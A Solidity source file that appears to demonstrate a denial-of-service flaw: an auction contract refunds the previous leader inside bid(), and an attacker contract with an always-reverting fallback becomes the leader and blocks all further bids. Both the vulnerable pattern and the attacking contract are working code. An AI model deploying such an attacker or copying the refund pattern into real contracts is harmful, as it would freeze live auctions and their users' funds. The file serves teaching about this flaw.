// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @title VulnerableContract
 * @dev This contract is vulnerable to a denial of service (DoS) attack
 */
contract VulnerableContract {
    address payable leader;
    uint256 public highestBid;

    /// Place a bid to the contract and if it is the highest bid
    /// send the previous leader the current bid and set the leader
    /// to the sender with the new highest bid
    function bid() external payable {
        require(msg.value > highestBid);

        // Refund the old leader, if it fails then revert
        require(leader.send(highestBid));

        leader = payable(msg.sender);
        highestBid = msg.value;
    }

    /// Helper function to check leader
    function getLeader() external view returns (address) {
        return leader;
    }
}

/**
 * @title AttackerContract
 * @dev This contract will attack the vulnerable contract to demo DoS
 */
contract AttackerContract {
    VulnerableContract vulnerableContract;

    constructor(VulnerableContract _vulnerableContract) {
        vulnerableContract = _vulnerableContract;
    }

    /// Prevent this contract from taking ETH
    fallback() external payable {
        revert();
    }

    /// Place a bid to the vulnerable contract
    function placeBid() external payable {
        require(msg.value > vulnerableContract.highestBid());

        vulnerableContract.bid{value: msg.value}();
    }
}